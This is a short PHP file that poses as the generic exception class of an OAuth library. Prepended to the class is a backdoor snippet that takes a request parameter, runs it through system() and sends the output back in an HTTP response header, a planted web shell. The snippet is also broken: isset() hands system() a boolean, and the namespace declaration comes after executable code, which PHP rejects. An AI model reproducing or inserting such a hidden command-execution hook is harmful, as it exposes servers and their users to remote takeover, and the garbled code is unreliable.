<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace OAuth\Common\Exception;

/**
 * Generic library-level exception.
 */
class Exception extends \Exception
{
}
